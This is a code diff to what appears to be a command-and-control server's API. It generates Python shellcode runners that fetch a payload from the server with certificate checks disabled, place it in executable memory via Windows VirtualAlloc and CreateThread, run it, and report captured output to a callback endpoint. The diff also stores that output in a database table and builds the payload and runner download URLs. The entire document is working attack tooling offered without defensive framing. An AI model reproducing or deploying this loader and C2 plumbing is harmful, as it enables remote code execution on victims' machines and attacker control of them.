@@ -32,36 +32,64 @@ def send_status(url, data):
     return f"""import ctypes as mill
 import sys, requests as r
 import urllib3
+import io
+import contextlib
+import traceback
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 {callback_code}
+output = io.StringIO()
 def mi(little):   
+    print("Starting shellcode runner script")
     try:
         bmx = r.get(little, verify=False).content
+        print(f"Downloaded shellcode of length: {{len(bmx)}}")
     except r.exceptions.RequestException as e:
         print(f"Error downloading file: {{e}}")
-        if '{callback_url}':
-            send_status('{callback_url}', {{'status': 'error', 'message': str(e)}})
+        if {bool(callback_url)}:
+            try:
+                send_status('{callback_url}', {{'status': 'error', 'message': str(e), 'output': output.getvalue()}})
+            except Exception:
+                pass
         return
 
     mill.windll.kernel32.VirtualAlloc.restype = mill.c_void_p
     mill.windll.kernel32.CreateThread.argtypes = (
         mill.c_int, mill.c_int, mill.c_void_p, mill.c_int, mill.c_int, mill.POINTER(mill.c_int))
 
-    spc = mill.windll.kernel32.VirtualAlloc(
-        mill.c_int(0), mill.c_int(len(bmx)), mill.c_int(0x3000), mill.c_int(0x40))
-    bf = (mill.c_char * len(bmx)).from_buffer_copy(bmx)
-    mill.windll.kernel32.RtlMoveMemory(mill.c_void_p(spc), bf, mill.c_int(len(bmx)))
-    hndl = mill.windll.kernel32.CreateThread(
-        mill.c_int(0), mill.c_int(0), mill.c_void_p(spc), mill.c_int(0), mill.c_int(0),
-        mill.pointer(mill.c_int(0)))
+    try:
+        print("Allocating memory for shellcode")
+        spc = mill.windll.kernel32.VirtualAlloc(
+            mill.c_int(0), mill.c_int(len(bmx)), mill.c_int(0x3000), mill.c_int(0x40))
+        print(f"Memory allocated at address: {{spc}}")
+        bf = (mill.c_char * len(bmx)).from_buffer_copy(bmx)
+        mill.windll.kernel32.RtlMoveMemory(mill.c_void_p(spc), bf, mill.c_int(len(bmx)))
+        print("Shellcode copied to allocated memory")
+        hndl = mill.windll.kernel32.CreateThread(
+            mill.c_int(0), mill.c_int(0), mill.c_void_p(spc), mill.c_int(0), mill.c_int(0),
+            mill.pointer(mill.c_int(0)))
+        print(f"Thread created with handle: {{hndl}}")
 
-    mill.windll.kernel32.WaitForSingleObject(hndl, mill.c_uint32(0xffffffff))
-    if '{callback_url}':
-        send_status('{callback_url}', {{'status': 'success', 'message': 'Shellcode executed'}})
+        mill.windll.kernel32.WaitForSingleObject(hndl, mill.c_uint32(0xffffffff))
+        print("Shellcode executed successfully")
+        if {bool(callback_url)}:
+            try:
+                send_status('{callback_url}', {{'status': 'success', 'message': 'Shellcode executed', 'output': output.getvalue()}})
+            except Exception:
+                pass
+    except Exception as e:
+        print("Exception during shellcode execution:")
+        traceback.print_exc()
+        if {bool(callback_url)}:
+            try:
+                send_status('{callback_url}', {{'status': 'error', 'message': str(e), 'output': output.getvalue()}})
+            except Exception:
+                pass
 
 if __name__ == "__main__":
     little = "{shellcode_url}"
-    mi(little)"""
+    with contextlib.redirect_stdout(output):
+        mi(little)
+"""
 
 
 def init_api_routes(app, socketio):
@@ -75,6 +103,7 @@ def init_api_routes(app, socketio):
             agent_id = data.get('agent_id')
             status = data.get('status')
             message = data.get('message')
+            output = data.get('output', '')
             timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
             
             if not agent_id or not status:
@@ -90,13 +119,14 @@ def init_api_routes(app, socketio):
                     agent_id TEXT NOT NULL,
                     status TEXT NOT NULL,
                     message TEXT,
+                    output TEXT,
                     timestamp TEXT NOT NULL
                 )
             ''')
             
-            c.execute('''INSERT INTO shellcode_outputs (agent_id, status, message, timestamp)
-                         VALUES (?, ?, ?, ?)''',
-                      (agent_id, status, message, timestamp))
+            c.execute('''INSERT INTO shellcode_outputs (agent_id, status, message, output, timestamp)
+                         VALUES (?, ?, ?, ?, ?)''',
+                      (agent_id, status, message, output, timestamp))
             
             conn.commit()
             conn.close()
@@ -106,6 +136,7 @@ def init_api_routes(app, socketio):
                 'agent_id': agent_id,
                 'status': status,
                 'message': message,
+                'output': output,
                 'timestamp': timestamp
             })
             
@@ -877,11 +908,20 @@ def init_api_routes(app, socketio):
             with open(shellcode_path, 'wb') as f:
                 f.write(shellcode)
             
+            # Determine server URL from agent_configurations
+            conn = sqlite3.connect(CONFIG.database)
+            c = conn.cursor()
+            c.execute("SELECT server_url FROM agent_configurations ORDER BY timestamp DESC LIMIT 1")
+            row = c.fetchone()
+            conn.close()
+            server_url = row[0] if row else request.url_root.rstrip('/')
+            
             # Generate shellcode URL
-            shellcode_url = f"{request.url_root}api/download_shellcode/{shellcode_name}"
+            shellcode_url = f"{server_url}/api/download_shellcode/{shellcode_name}"
             
             # Generate runner script
-            runner_content = _generate_runner_script(shellcode_url)
+            callback_url = f"{server_url}/api/shellcode_output"
+            runner_content = _generate_runner_script(shellcode_url, callback_url)
             runner_name = f"runner_{uuid.uuid4().hex[:8]}.py"
             runners_dir = os.path.join(app.root_path, 'runners')
             os.makedirs(runners_dir, exist_ok=True)
@@ -890,7 +930,7 @@ def init_api_routes(app, socketio):
             with open(runner_path, 'w') as f:
                 f.write(runner_content)
                 
-            runner_url = f"{request.url_root}api/download_runner/{runner_name}"
+            runner_url = f"{server_url}/api/download_runner/{runner_name}"
             
             # Create task for agent
             conn = sqlite3.connect(CONFIG.database)
